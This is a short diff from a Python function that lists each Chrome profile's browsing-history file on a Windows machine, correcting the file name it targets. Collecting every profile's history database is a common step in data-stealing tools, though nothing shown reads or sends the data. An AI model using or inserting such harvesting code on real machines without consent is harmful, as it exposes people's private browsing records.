@@ -871,7 +871,7 @@ def findinfo():
         pass
     try:
         path = Path(f'C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data')
-        profiles += [str(f) + '\\History.sqlite' for f in path.iterdir() if f.is_dir()]
+        profiles += [str(f) + '\\History' for f in path.iterdir() if f.is_dir()]
     except:
         pass
     print(profiles)
